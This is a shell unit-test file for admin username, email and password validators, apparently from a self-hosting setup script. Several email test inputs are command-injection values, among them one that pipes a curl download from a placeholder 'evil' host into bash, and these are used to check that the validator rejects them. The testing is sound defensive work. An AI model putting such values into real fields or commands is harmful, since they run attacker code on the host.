# Owns: Admin identity validator tests.
# Sources: tests/unit/validators.sh setup and scripts/lib/validators/account.sh.

# ---------------------------------------------------------------------------
# Admin identity validators
# ---------------------------------------------------------------------------
reset_warn
validate_admin_user "media_admin"
rc=$?
assert_eq "0" "$rc" "validate_admin_user: accepts valid username"
assert_eq "0" "$WARN_COUNT" "validate_admin_user: valid username emits no warn"

reset_warn
validate_admin_user "ab"
rc=$?
assert_eq "1" "$rc" "validate_admin_user: rejects too-short username"
assert_eq "1" "$WARN_COUNT" "validate_admin_user: too-short warns once"

reset_warn
validate_admin_user "bad'name"
rc=$?
assert_eq "1" "$rc" "validate_admin_user: rejects single quote"
assert_contains "$LAST_WARN" "single quote" "validate_admin_user: single-quote copy"

reset_warn
validate_admin_email "owner@example.net"
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects example.net"
assert_eq "1" "$WARN_COUNT" "validate_admin_email: example.net warns once"

reset_warn
validate_admin_email "owner@home.test"
rc=$?
assert_eq "0" "$rc" "validate_admin_email: accepts real email"

reset_warn
validate_admin_email "invalid-email"
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects malformed email"
assert_contains "$LAST_WARN" "user@domain.tld" "validate_admin_email: malformed copy"

# Defense in depth — shell metacharacters that would break out of
# the single-quoted NPM_ADMIN_EMAIL line on .env source.
reset_warn
validate_admin_email "alice'@x.com"
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects single quote"
assert_contains "$LAST_WARN" "single quote" "validate_admin_email: single-quote copy"

reset_warn
validate_admin_email '$(curl evil|bash)@x.com'
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects \$ command substitution"

reset_warn
validate_admin_email 'a@b;evil.com'
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects ;"

reset_warn
validate_admin_email "alice @x.com"
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects whitespace"

# 1-char TLD must be rejected at Stage 1 (LE rejects it later).
reset_warn
validate_admin_email "alice@x.c"
rc=$?
assert_eq "1" "$rc" "validate_admin_email: rejects 1-char TLD"
assert_contains "$LAST_WARN" "TLD" "validate_admin_email: TLD copy"

reset_warn
validate_admin_email "alice@example.co"
rc=$?
assert_eq "0" "$rc" "validate_admin_email: accepts 2-char TLD"

reset_warn
validate_admin_password "longenough12"
rc=$?
assert_eq "0" "$rc" "validate_admin_password: accepts 12+ chars with 2 character types"

reset_warn
validate_admin_password "longenoughpw"
rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects 12+ chars with only 1 character type"

reset_warn
validate_admin_password "11charssss"
rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects 10 chars (below Portainer floor)"

reset_warn
validate_admin_password "short"
rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects short password"
assert_eq "1" "$WARN_COUNT" "validate_admin_password: short warns once"

reset_warn
validate_admin_password "bad'quote"
rc=$?
assert_eq "1" "$rc" "validate_admin_password: rejects single quote"
